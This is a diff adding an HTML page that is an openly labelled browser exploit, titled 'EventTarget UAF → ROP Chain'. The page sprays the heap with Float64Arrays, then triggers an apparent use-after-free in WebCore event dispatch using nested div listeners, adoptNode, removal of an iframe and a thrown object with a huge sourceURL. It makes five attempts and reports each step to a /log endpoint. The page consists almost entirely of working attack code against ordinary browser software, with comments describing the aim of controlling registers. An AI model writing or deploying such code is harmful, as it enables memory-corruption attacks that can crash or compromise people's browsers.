@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>EventTarget Exploit - ROP Attempt</title>
+<style>
+body { background:#000; color:#0f0; font-family:monospace; font-size:14px; padding:20px; }
+h1 { color:#ff0; }
+</style>
+</head>
+<body>
+<h1>EventTarget UAF → ROP Chain</h1>
+<hr>
+<div id="log"></div>
+<script>
+var el = document.getElementById('log');
+var logHistory = [];
+
+function log(m, c) {
+    var d = document.createElement('div');
+    d.className = c || '';
+    d.textContent = m;
+    el.appendChild(d);
+    logHistory.push(m);
+    try { var x = new XMLHttpRequest(); x.open('GET','/log?m='+encodeURIComponent(m),false); x.send(); } catch(e) {}
+}
+
+function die(m) { log('FATAL: ' + m, 'r'); throw new Error(m); }
+
+log('=== EventTarget UAF Exploit ===', 'c');
+
+// Phase 1: Heap spray with controlled data
+// We spray with Float64Arrays because:
+// - They are fastMalloc'd (WebCore heap)  
+// - We control the backing store content
+// - When freed, the backing store bytes remain
+log('Phase 1: Heap grooming...', 'y');
+
+var spray = [];
+var SPRAY_COUNT = 2000;
+var BUF_SIZE = 256;
+
+// Spray with Float64Arrays containing controlled patterns
+for (var i = 0; i < SPRAY_COUNT; i++) {
+    var f64 = new Float64Array(BUF_SIZE / 8);
+    // Fill with pattern: alternating address-like values
+    for (var j = 0; j < f64.length; j++) {
+        // We'll try different patterns
+        f64[j] = 0.4141414141414141; // looks like NaN-boxed 'AAAA'
+    }
+    spray.push(f64);
+}
+
+log('Sprayed ' + SPRAY_COUNT + ' Float64Arrays', 'c');
+
+// Phase 2: Create the event target structure
+log('Phase 2: Setting up EventTarget structure...', 'y');
+
+// We need: parent(a) with listener, child(b) with listener, iframe(f)
+// The event bubbling from b→a triggers the UAF in a's listener
+
+function trigger() {
+    log('Trigger: creating iframe...', 'c');
+    var f = document.body.appendChild(document.createElement('iframe'));
+    
+    log('Trigger: creating div hierarchy...', 'c');
+    var a = document.createElement('div');
+    var b = a.appendChild(document.createElement('div'));
+    
+    // listener1 on 'a': does adoptNode + remove iframe + throws error
+    var triggered = false;
+    a.addEventListener('a', function() {
+        if (triggered) return;
+        triggered = true;
+        log('Listener a1: executing adoptNode + remove', 'c');
+        
+        try {
+            document.adoptNode(a);
+        } catch(e) {}
+        
+        try {
+            f.remove();
+        } catch(e) {}
+        
+        // The huge sourceURL string controls rax
+        // We need this to be an address, not 'AAAA'
+        // But we can't know the address yet (ASLR)
+        // So we use a pattern that might work as a NaN-boxed pointer
+        
+        log('Listener a1: throwing with controlled sourceURL', 'c');
+        throw {
+            line: 1,
+            column: 1,
+            sourceURL: 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32)
+        };
+    });
+    
+    // empty listener on 'a' - for priority manipulation
+    a.addEventListener('a', function() {});
+    
+    // listener on 'b': does adoptNode from iframe
+    b.addEventListener('a', function() {
+        log('Listener b: trying adoptNode from removed iframe', 'c');
+        try {
+            f.contentDocument.adoptNode(a);
+        } catch(e) {
+            log('Listener b: exception: ' + e.constructor.name, 'c');
+        }
+    });
+    
+    log('Trigger: dispatching event (UAF trigger)', 'r');
+    b.dispatchEvent(new Event('a', { bubbles: true }));
+    log('Trigger: event dispatched - if you see this, survived', 'g');
+}
+
+// Phase 3: Multiple attempts
+log('Phase 3: Running trigger attempts...', 'y');
+
+for (var attempt = 0; attempt < 5; attempt++) {
+    log('--- Attempt ' + attempt + ' ---', 'c');
+    
+    // Re-spray before each attempt
+    if (attempt > 0) {
+        for (var i = 0; i < 500; i++) {
+            var f64 = new Float64Array(BUF_SIZE / 8);
+            for (var j = 0; j < f64.length; j++) {
+                f64[j] = 0.4141414141414141;
+            }
+        }
+    }
+    
+    try {
+        trigger();
+    } catch(e) {
+        log('Attempt ' + attempt + ' exception: ' + e.constructor.name + ': ' + (e.message || '').substring(0, 80), 'r');
+    }
+}
+
+log('=== All attempts done ===', 'c');
+log('If browser crashed during attempts, the UAF was triggered', 'y');
+log('Results: ' + logHistory.length + ' entries logged', 'c');
+</script>
+</body>
+</html>
